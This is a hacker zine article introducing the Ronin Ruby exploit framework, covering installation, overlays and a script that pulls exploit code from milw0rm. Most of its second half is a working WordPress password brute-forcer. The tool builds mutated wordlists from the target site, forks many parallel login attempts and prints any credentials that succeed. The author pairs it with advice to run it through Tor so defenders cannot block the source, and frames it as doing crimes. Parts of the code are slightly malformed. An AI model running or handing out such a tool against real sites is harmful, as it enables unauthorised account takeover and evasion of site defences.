---
layout: default
title: "Hack This Zine #8 article - Ronin"
---

# Hack This Zine #8 - Ronin

**Dave Bowman**: Open the pod bay doors, HAL.<br />
**HAL**: I'm sorry, Dave. I'm afraid I can't do that.<br />
**Dave Bowman**: What's the problem?<br />
**HAL**: I think you know what the problem is just as well as I do.<br />

    ronin add --git https://github.com/postmodern/postmodern-overlay.git
    ronin
    ronin>> pod_bay_door.open

**HAL**: Daisy, Daisy, give me your answer do...<br />
* [2001: A Space Odyssey](http://www.imdb.com/title/tt0062622/)
  (partialy remixed)

> "Ronin is a Ruby platform for exploit development and security research. 
> Ronin allows for the rapid development and distribution of code, exploits 
> or payloads over many common Source-Code-Management (SCM) systems." [2]

## Getting Started with Ruby

With ronin being an exploit development framework written in Ruby it should go 
with out saying that you are going to have to learn Ruby.  If you don't
already know a programming language, Ruby is a fine one to start with [1].  If you don't
know Ruby yet, but know other languages, it's time to jump on the bandwagon.
If you haven't noticed already all exploit development is moving away from 
Perl and other languages like C (I know I am gonna get flamed for this one), and 
into python and ruby.  Wether you are new to programming or just new to the
language, following through Ronin code will be a good introduction to Ruby, 
because Postmodern, the author, goes to painstaking lengths to follow Ruby 
best practices.

### Gem's etc

There is good documentation on the Ronin site [2] for installing the 
whole suite of Ronin libraries [3].  After you get Ruby installed you are
going to install the ruby gems library [4].  RubyGems is a package 
management system for Ruby gems (aka libraries, plugins, modules, classes, 
extensions) that allows you to install, update, and query the gems 
installed on your system.  Ronin itself is a gem, as well as it's additional 
libraries; ronin-web, ronin-php, ronin-dorks, ronin-sql, ronin-scanners,
ronin-exploits, etc.  If you want to be using the latest and greatest 
(read most buggy) version of ronin and friends you will need to use the
versions from github.com.  Gems are released from the code base on GitHub
once they have reached a certain quality or due to community demand.
Installing ronin, or a ronin library, is as simple as:

    sudo gem install ronin

Interacting with your gem installation might look like:

    # list all ronin gems installed on your system
    evoltech@jwaters:~/src/htz$ gem list ronin

    *** LOCAL GEMS ***

    ronin (0.2.4, 0.2.3, 0.2.2)
    ronin-dorks (0.1.1)
    ronin-exploits (0.2.0)
    ronin-gen (0.1.0)
    ronin-php (0.1.1)
    ronin-scanners (0.1.4)
    ronin-sql (0.2.2)
    ronin-web (0.1.2) 

    # Update all of the installed gems on your system
    evoltech@jwaters:~/src/htz$ sudo gem update
    Updating installed gems
    ...
    Gems updated: ronin-dorks, ronin-exploits, ronin-gen, ronin-web, ronin-php, 
    ronin-sql, rspec, rubyforge, term-ansicolor

### Ronin and Git[hub] [5]

Ronin development and collaboration is done with the Git source code management 
(SCM) system. github.com is used to host the authoritative remote repositories. 
By creating a GitHub account and forking one of the ronin repositories for your 
development needs, you will be integrating into the ronin development 
community. This will allow core ronin developers to use Git and GitHub's 
features to accept contributions.

Using Git with ronin is well documented on the ronin website [5].  If you are
working with a copy of Ronin and or Ronin libraries from their Git
repository and 
also have the related gems installed on your system, you will need to 
distinguish between the Git copy from the installed gem.  Safely using the most recent 
version (from github.com) can be accomplished by incrementing the VERSION constant
in the related version.rb file, then either re-rolling and installing a new
gem, or by including the package from the command line with irb [6].  Ruby's
default behavior when  requiring a new class is to include the most recent 
version as denoted by a libraries VERSION constant.  Postmodern makes this 
easier for people working with both gems and git versions by 
always incrementing the version number in the git source after there is a new gem
released.  This makes it so that the git source version will always be 
greater then the gem version.  You can always verify the version you are 
working with by:

    irb> puts Ronin::VERSION

A side note is that Ronin may use "Edge" (release 
candidates, beta versions, etc) versions of different libraries.  Most gems 
you use will be fetched from the default gem repository rubyforge.org.  In 
order to install a gem on the edge you will have to find where the Edge 
versions are hosted.  In most cases this will be github or the projects 
website (the gem source code hacking example below is made simpler with
the scripts from the drnic-github gem [9]).As an example, in Ronin 0.2.5 a 
version of datamapper is required 
where the edge gem (dm-core >=0.10.0) is located in a non-default repo.  On 
top of this there was some migration from rdoc to yard packages for 
documentation management with patches pending to dm-core. To install this 
repo you will have to:

    sudo gem source --add http://gems.datamapper.org/
    git clone https://github.com/postmodern/dm-core.git
    cd dm-core
    git checkout -b next --track origin/next
    git pull
    rake gem
    sudo gem install pkg/dm-core-0.10.0.gem
    sudo gem update

This being said, it is possible that your environment will need to be updated
when working with the development versions (hosted at github).  Before you 
start using the new ronin code you are going to want to run the test suite to
make sure everything checks out on your box.  This example shows testing a new
version of ronin; but is applicable to the other ronin libraries as 
well.

    cd ronin
    grep VERSION lib/ronin/version.rb
    VERSION = '0.2.5'
    rake spec
    # If you get errors here check that you have all the dependencies met.  Make
    # sure you have the dependencies specified in the self.extra_deps array.
    cat Rakefile

Rolling the new gem from the git source you just checked out can be done as 
for dm-core above:

    git clone https://github.com/ronin-ruby/ronin.git
    cd ronin
    rake gem
    sudo gem install pkg/ronin-0.2.5.gem

If instead you want to just load the library in from the command line when 
working with irb you can simply add all the additional include files from 
your local repos with:

    pwd
    ~/src/ronin
    irb -I ./lib
    irb> require 'ronin'
    irb> Ronin::VERSION
    => "0.2.5"

If you plan on working with a development branch of ronin you should check in
at #ronin on irc.freenode.net and possibly join the google group at 
http://groups.google.com/group/ronin-ruby.

## Overlays

In Ronin overlays are a way of distributing extra bits of code that make use
of the ronin framework.  Examples of this can be misc tools for exploit 
development, penetration testing, and exploits themselves.  Overlays can 
include libraries (extensions in ronin speak) that can then be used by other 
overlays so that, like in UNIX, one tool can be stringed together with 
another tool.  The concept of overlays is what seperates Ronin from other 
exploit development frameworks as this is where the decentralized sharing 
aspect comes in.  You can design tools that leverage ronin and make them 
public, or share them only with in your affinity group.

Overlays are organized in ronin via the "Platform", which is essentially just a 
local cache (~/.ronin) of your installed overlays.  An overlay is managed in 
the following way:

    ronin list
    ronin add https://github.com/postmodern/postmodern-overlay.git
    ronin update postmodern-overlay

    # Remove the local entry and delete the associated files.
    ronin uninstall postmodern-overlay

    # Remove the local entry for the overlay, but don't delete the files.
    ronin remove postmodern-overlay

## Overlay versions

Overlays are managed by Ronin::Platform.  This section of code describes the
Overlay API; file structure, recognized format of ronin.xml.  In the 
following example we will be using an overlay called postmodern-overlay
hosted at https://github.com/postmodern/postmodern-overlay.git.  This overlay
version will change as Ronin::Platform gets updated and may not always be 
compatible with the gem version of Ronin.  As of Ronin 0.3.0 if you want to
use a compatible version of postmodern-overlay you will have to check it out
with the ronin-0.3.0 tag:

    git clone https://github.com/postmodern/postmodern-overlay.git
    cd postmodern-overlay
    git checkout -b ronin-0.3.0 --track origin/ronin-0.3.0  

By the time this hits the press a new version of Ronin::Platform will be
out, that implements overlay versioning and can raise a warning 
when an incompatible Overlay is being used [7].

## Using Overlays
Overlays, like all other parts of the Ronin framework, can either be used 
from the Ronin Ruby Console or from a standalone script.  After an overlay
is installed in your environment and the Ronin Ruby Console is loaded the
Overlay Cache will be loaded with all of the overlays installed on your
system. 

    ronin>> Platform.overlays.names
    => ["postmodern-overlay"]
    ronin>> Platform.extension_names
    => ["dumpster", "milw0rm", "spec", "twitter"]

You are going to look through the code of the extensions in 
postmodern-overlay because there are some interesting tools in there
that show the ease of writing code capable of heavy lifting in a few lines.
Making use of the overlays is made overly simple since the extension names are
added directly into the local namespace:

    ronin>> milw0rm.remote.latest.title

The overlays and associated extensions can also be used in standalone
scripts 
as you might expect.  The following example shows how the milw0rm extension
in the postmodern-overlay can be used to search milw0rm.org/remote for 
exploits matching a certain pattern in their title and print the exploit to 
the screen.  Obviously, this is only to
show how this can be done as it would be much quicker to use the ronin-dorks
library ie.

    ronin>> puts Web::Dorks.search(:site => 'milw0rm.org/remote', :query => 'ftp').page(1).summaries

{% highlight ruby %}
#!/usr/bin/env ruby
require 'pp'
require 'ronin'
require 'optparse'
require 'ostruct'

include Ronin

options = OpenStruct.new
options.verbose = false
options.date = Date.today-90
options.subject = nil

begin
  OptionParser.new do |opts|
    opts.banner = "Usage: getAllWpExploits.rb [options]"

    opts.on("-v", "--[no-]verbose", "Run verbosely") do |v|
      options.verbose = v
    end

    opts.on("-d <date>", "Specify the <date> that exploits must be newer than.") do |d|
      options.date = Date.parse(d)
    end

    opts.on("-s <subject>", "Specify the <subject> that exploit must match.") do |s|
      options.subject = s
      options.subject_re = /#{s}/i
    end

    if (!defined? options.subject)
      puts opts
      puts options.subject
      raise OptionParser::MissingArgument, 'A subject to search for is required', caller
    end
  end.parse!
rescue OptionParser::MissingArgument
  puts $!
  exit
end

def findRemoteExploit(re, date)
  if (!re.instance_of? Regexp)
    raise ArgumentError, "First argument is not a Regexp", caller
  end

  if (!date.instance_of? Date)
    raise ArgumentError, "Second argument is not a Date", caller
  end

  start = 0
  dont_bail = true
  while page = Platform.milw0rm.remote[start]
    page.each { |exploit|
      # Check if it is older than the date.  We assume that the exploits are pulled
      # sorted by date so if we find one with a date greater than date we 
      # bail.
      if (exploit.date < date)
        dont_bail = false
        break
      end

      # Check if the title matches re.
      next unless exploit.title =~ re

      # It looks like the milw0rm extension doesn't parse title
      puts exploit.date.strftime('%Y-%m-%d') +", "+ exploit.title

      # Get the exploit.
      puts exploit.body
    }

    if (!dont_bail)
          break
    end

    start = start.succ
    end #while
end #find

puts "Looking for any remote exploit matching #{options.subject_re.inspect} in the title posted after "
puts "#{options.date.strftime '%Y-%m-%d'} on milw0rm.org"
findRemoteExploit(options.subject_re, options.date)
puts "Done."
{% endhighlight %}

---------------------------------------------------------------------------

> **Debbi**: *Fuck this shit lets go do some crimes.*<br />
> **Duke**: *Yeah. Let's go get sushi and not pay.*<br />
* [Repo man](http://www.imdb.com/title/tt0087995/)

You are probably tired or all the talk by this point and would like to see an
attack on an actual target.  Well your not going to get it, but what I will
give you is an attack on a hypothetical target.  In this issue I am going to
cop out with a dictionary attack on a wordpress site, but next issue we will
cover porting code from milw0rm and other frameworks like metasploit, and 
multi-level attacks using ronin.

Since plain old dictionary attacks on websites are so boring we will try and 
improve our chances by first scraping a site for all words then mutating those
words to provide a wordlist.  After this is done we will spawn off a bunch of
jobs to try and log into the site.

This process is made simple with yet another gem, written by our good friend
postmodern and maintained by the SophSec crew, called wordlist [8].  The 
assumption is that most dictionaries will have way too many words to try all
of them, but the selection of words on a website may comprise a smaller 
dictionary that contains a word that may be used as the admin password,
possibly with some mutations.  Another problem is that password attacks on
a website are slow if you follow the HTTP standard and not make more than 2
requests to the same domain at a time, but why would we follow that rule?
We'll fork as many as we need.  And of course we don't want our sysadmin on
the other end to have it easy and be able to whitelist a single ip, so we'll
run the whole damn thing through tor (now they could just block tor which would
be a bummer).

{% highlight ruby %}
#!/usr/bin/env ruby
require 'ronin/web'
require 'optparse'
require 'ostruct'
require 'wordlist/builders/website' # https://github.com/sophsec/wordlist
require 'wordlist'
require 'logger'

include Ronin

class App
  VERSION = '0.0.1'

  attr_reader :options

  def initialize(arguments)
    @arguments = arguments
    @options = OpenStruct.new
    @options.verbose = false
    @options.host = nil
    @options.word_list = nil
    @options.file = 'list.txt'
    @options.threads = 10
    @options.path = '/wp-login.php'
    @options.user = 'admin'
    @opts = nil
    @mutations = {
      'a' => '@', 'a' => '4', 'A' => '@', 'A' => '4',

      'b' => '8', 'B' => '8',

      'c' => '(', 'C' => '(',

      'e' => '3', 'E' => '3',

      'g' => '6', 'G' => '6',

      'i' => '1', 'I' => '1', 'i' => '|', 'I' => '|', 'i' => '!', 'I' => '!',

      'l' => '1', 'L' => '1', 'l' => '!', 'L' => '!', 'l' => '|', 'L' => '|',

      'o' => '0', 'O' => '0',

      's' => '5', 'S' => '5',

      't' => '7', 'T' => '7', 't' => '+', 'T' => '+',
    }

    file = File.open('smartBruteForceWP.log', File::WRONLY | File::APPEND)
      @options.logger = Logger.new(file)
      @options.logger.level = Logger::DEBUG
    end
  end

  def run 
    if parsed_options?
      # @todo Before we build the word list lets verify that we have a vaild
      # path for login and confirm that that the user we are using is valid
      # This can be accomplished be checking the returnvalue of logging in
      # with one character for the pass and the user and seeing if the
      # response is Invalid username vs Invalid password.

      # Generate the wordlist.  We want words greater than 5 characters
      # and less then 15.  We would also like to perform some l33t speak
      # mutations on the words.
      @options.logger.debug("#{Process.pid}: Generating wordlist (#{options.file}) from #{options.host}")

      ws = Wordlist::Builders::Website.build(
        @options.file,
        :host => @options.host
      )

      @options.logger.debug("#{Process.pid}: Building a wordlist from (#{options.file})")

      list = Wordlist::FlatFile.new(
        @options.file,
        :max_length => 15,
        :min_length => 5
      )

      @options.logger.debug("mutating list with #{@mutations.inspect}")

      build_mutations! list

      # Create a bunch of processes for contacting the target site and trying
      # to log in with our word.  Bail on success.
      pids = []
      wordct = 0
      url = 'http://' + options.host + options.path

      @options.logger.debug("Brute forcing #{url} with #{@options.threads} threads")

      query = {:log => options.user, 'wp-submit' => "Log In"}

      list.each_mutation do |word|
        wordct = wordct.succ

        # Only allow options.threads to run at once
        if pids.size >= @options.threads.to_i
          pid = Process.wait

          exit if ($?.exitstatus == 1)
          pids.delete pid
        end

        pids << fork do
          query[:pwd] = word

          @options.logger.debug("#{query.inspect}")

          if Ronin::Web.post(url, :query => query).parser.css('#login_error').size == 0
            # Now it is safe to bail on all the threads.
            puts "username:#{options.user}, password:#{word}"
            exit 1
          end
        end
      end

      pids.each do  |pid|
        Process.waitpid pid

        exit if ($?.exitstatus == 1)
      end

      puts "Tried #{wordct} passwords and was unable to login."
    else 
      output_usage 
    end 
  end 

  protected

  def build_mutations!(list)
    @mutations.each { |key, val| list.mutate key, val }
  end

  def parsed_options?
    begin
      @opts = OptionParser.new
      @opts.banner = "Usage: smartBruteForceWP.rb [options]"

      @opts.on("-v", "--[no-]verbose", "Run verbosely") do |v|
          @options.verbose = v
      end

      @opts.on("-t=THREADS", "Specify the number of concurrent requests we should make.") do |t|
        @options.threads = t
      end

      @opts.on("-p=PATH", "Specify the PATH to wp-login.php.") do |p|
        @options.path = p
      end

      @opts.on("-u=USER", "Specify the USER to login as.") do |u|
        @options.user = u
      end

      @opts.on("-s=SITE", "Specify the <site> to brute force.") do |s|
        @options.host = s
      end

      @opts.parse!

      if (@options.host.nil?)
        raise(OptionParser::MissingArgument,'A subject to search for is required',caller)
      end 
    rescue OptionParser::MissingArgument 
      puts $!  
      return false 
    end 

    true 
  end 

  def output_usage 
    puts @opts 
  end 
end 

app = App.new ARGV 
app.run
{% endhighlight %}

You may want to experiment with running this code through a the torify command
to make sure all of the requests don't come from the same ip. The default number
of child processes to generate is configurable via the -t option, but the 
default is 10 processes.  

    torify ruby ./smartBruteForce.rb -s wp28.com -t 100 -u admin

The HTZ 8 zine subversion repository [9] contains a much larger mutation
file and will be the location for any updates and branches to this 
application.

### THANKS

Postmodern for doing a lot of hand holding with me through the code
and getting me up to speed with all that is ruby and git.  Double thanks
for the quick turn around on the wordlist lib.
http://houseofpostmodern.wordpress.com

[Sbit](http://www.google.com/profiles/sanitybit) for providing QA for Ronin, especially for the ronin-0.3.0 release, 
debian installation, and `AWESOME.times! 300`

[HB-core](http://hackbloc.org): Flatline, Impact, Frenzy, Ringo, Hexy-poo, alxCIAda, doll

### References

[1] Pickaxe - The name given to _the_ Ruby language documentation.  A site 
hosting the book with a nice browseable TOC and Index all in frames is here:
http://www.rubycentral.com/book/.

[2] Ronin - The main site for the Ronin project: http://ronin-ruby.github.io/.

[2.a] ronin-ruby.github.io on GitHub - The code base for the main Ronin site
powered by [Jekyll](https://github.com/mojombo/jekyll/), a static
website/blog generator written in Ruby. The site source can be cloned
through GitHub here:
https://github.com/ronin-ruby/ronin-ruby.github.io/

[3] Installing Ronin on Debian - Detailed instructions for getting the Ronin
(and Ruby) code base on a Debian computer.  If your installation steps are 
significantly different than what is here, please write them up and submit
them to the documentation project [2.a]. 
http://ronin-ruby.github.io/howtos/ronin_on_debian.html

[4] [RubyGems](http://rubygems.org) - "The premier Ruby packaging system".

[5] [Fork a Repo](https://help.github.com/articles/fork-a-repo) -
Detailed tutorial for using git to hack on Ronin is available here.

[6] IRB - The Interactive Ruby Interpreter.  This is the "Ruby command Line", 
extended by Ronin to create the ECD (Electronic Civil Disobedience) command 
line that is Ronin.  More info on using Ruby IRB is here: 
http://whytheluckystiff.net/ruby/pickaxe/html/irb.html

[7] Ronin Overlays - An email from postmodern on 2009-10-25 discussing 
upcoming changes in Ronin::Platform.
http://groups.google.com/group/ronin-ruby/browse_frm/month/2009-10

[8] wordlist - A ruby library for generating and working with word-lists.
Project homepage - http://wordlist.rubyforge.org/
Github homepage - https://github.com/sophsec/wordlist
Postmoderns discussion of the project - http://houseofpostmodern.wordpress.com/2009/10/21/introducing-wordlist-0-1-0/
Since this will be read on paper by a good number of people I will include
a bit of the source for this library here, because it is nothing short of code
poetry

{% highlight ruby %}
    # Build a wordlist from a dictionary file, only selecting words between
    # 5 and 15 characters.  
    list = Wordlist::FlatFile.new('dictionary.txt', {:max_length => 15, :min_length => 5})
    
    # Add the mutations you would like to be performed.  This method can actualy do some 
    # very complex mutations.
    list.mutate 'a', '@'
    list.mutate 'e', '3'
    
    list.each_mutation do |word|
      puts word
    end
    # => @apple, @ppl3, appl3, apple, etc
{% endhighlight %}

wordlist/list.rb: Wordlist::List.each_mutation:

{% highlight ruby %}
    #
    # Enumerates through every unique mutation, of every unique word, using
    # the mutator rules define for the list. Every possible unique mutation
    # will be passed to the given _block_.
    #
    #   list.each_mutation do |word|
    #     puts word
    #   end
    #
    def each_mutation(&block)
      mutation_filter = UniqueFilter.new()
    
      mutator_stack = [lambda { |mutated_word|
        # skip words shorter than the minimum length
        next if mutated_word.length < @min_length
    
        # truncate words longer than the maximum length
        mutated_word = mutated_word[0,@max_length] if @max_length
    
        if mutation_filter.saw!(mutated_word)
          yield mutated_word
        end
      }]

      # @mutators is a local array of Mutator objects, see below
      (@mutators.length-1).downto(0) do |index|
        mutator_stack.unshift(lambda { |word|
          prev_mutator = @mutators[index]
          next_mutator = mutator_stack[index+1]
    
          prev_mutator.each(word,&next_mutator)
        })
      end

      each_unique(&(mutator_stack.first))
    end
{% endhighlight %}

wordlist/mutator.rb: Wordlist::Mutator.each:

{% highlight ruby %}
    #
    # Performs every possible replacement of data, which matches the
    # mutators +pattern+ using the replace method, on the specified _word_
    # passing each variation to the given _block_.
    #
    def each(word)
      choices = 0
    
      # first iteration
      yield(word.gsub(@pattern) { |matched|
        # determine how many possible choices there are
        choices = ((choices << 1) | 0x1)

        replace(matched)
      })

      (choices - 1).downto(0) do |iteration|
        bits = iteration
    
        yield(word.gsub(@pattern) { |matched|
          result = if ((bits & 0x1) == 0x1)
                     replace(matched)
                   else
                     matched
                   end
    
          bits >>= 1
          result
        })
      end

      return word
    end
{% endhighlight %}

[9] An article by Dr. Nic about the "find it, fork it, clone it, build it, 
install it, technologic" work-flow using git and rubygems.
http://drnicwilliams.com/2009/11/04/hacking-someones-gem-with-github-and-gemcutter/ 

[9] HTX 8 subversion repository:
https://hackbloc.org/svn/htz/8/
Large Mutation list: https://hackbloc.org/svn/htz/8/mutations-full.txt
Smart Word Press Password Brute Forcer: 
https://hackbloc.org/svn/htz/8/smartBruteForceWP.rb
